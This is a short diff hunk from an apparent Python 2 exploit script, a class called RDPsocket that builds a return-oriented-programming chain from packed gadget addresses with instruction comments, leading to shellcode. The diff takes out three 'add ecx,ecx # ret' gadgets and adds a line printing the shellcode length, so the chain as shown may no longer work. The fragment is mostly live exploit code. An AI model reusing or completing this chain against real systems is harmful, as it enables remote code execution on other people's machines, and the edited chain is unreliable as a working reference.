@@ -82,9 +82,7 @@ class RDPsocket(socket.socket):
         parsed += struct.pack(">I", 0x8fe0e32d) #xchg eax,edx
         parsed += struct.pack(">I", 0x8fe0c0c7) #inc ecx # xor al,0xc9
         parsed += struct.pack(">I", 0x8fe0c0c7) #inc ecx # xor al,0xc9
-        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
-        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
-        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
+        print "Shellcode length: %d" % len(shellcode)
         parsed += struct.pack(">I", 0x8fe2def4) #add eax,ecx # ret # swap back
         parsed += struct.pack(">I", 0x8fe0e32d) #xchg eax,edx # copy parameter to placeholder
         parsed += struct.pack(">I", 0x8fe2fb61) #mov [eax],edx # pop eax # ret # set our stack pointer back to original value
